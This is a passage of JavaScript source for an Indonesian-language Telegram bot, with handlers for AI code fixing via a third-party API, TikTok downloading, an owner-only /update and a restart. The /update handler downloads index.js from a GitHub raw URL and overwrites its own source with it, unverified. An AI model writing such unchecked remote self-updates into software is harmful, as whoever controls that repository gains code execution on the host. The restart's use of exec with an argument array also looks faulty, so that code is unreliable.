    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  let args = match[1] ? match[1].trim() : "";
  if (!args) {
    return bot.sendMessage(
      chatId,
      "🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/"
    );
  }

  let url = args;

  // Ambil URL dari entities bukan dari teks mentah
  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses video");

  try {
    // Request API TikWM
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        accept: "application/json,text/plain,*/*",
        referer: "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data) {
      return bot.sendMessage(
        chatId,
        "❌ ☇ Gagal ambil data video pastikan link valid"
      );
    }

    const d = data.data;

    // Jika postingan berupa foto (slideshow)
    if (Array.isArray(d.images) && d.images.length > 0) {
      const imgs = d.images.slice(0, 10);

      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: Buffer.from(res.data)
          };
        })
      );

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    // Ambil link video (prioritas: no wm → hd → with wm)
    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(chatId, Buffer.from(video.data), {
      filename: `${d.id || Date.now()}.mp4`,
      supports_streaming: true
    });
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
      : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";

    await bot.sendMessage(chatId, errMsg);
  } finally {
    // Hapus pesan "menunggu"
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch {}
  }
});
bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isOwner(msg.from.id)) {
        return bot.sendMessage(chatId, "⚠️ Hanya owner yang boleh update bot!");
    }

    const repoRaw = "https://raw.githubusercontent.com/DyyZy-cyber/Dycok/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        setTimeout(() => process.exit(0), 1000);
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.onText(/^\/restart$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "⚠️ Hanya owner yang boleh restart bot!");
  }

  await bot.sendMessage(chatId, "♻️ Merestart bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = exec(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});

